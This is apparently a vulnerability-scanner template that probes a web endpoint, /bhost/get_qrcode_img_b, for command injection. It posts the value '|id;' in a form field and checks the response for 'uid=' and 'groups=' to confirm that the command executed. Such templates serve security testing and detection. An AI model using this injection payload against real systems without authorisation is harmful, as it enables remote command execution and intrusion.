id: get_qrcode_img_b_rce
info:
  name: get_qrcode_img_b_rce
  author: webui
  severity: high
http:
  - raw:
      - |-
        POST /bhost/get_qrcode_img_b HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
        Content-Length: 9
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Referer: 
        
        z1="|id;"
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'groups='
    matchers-condition: and
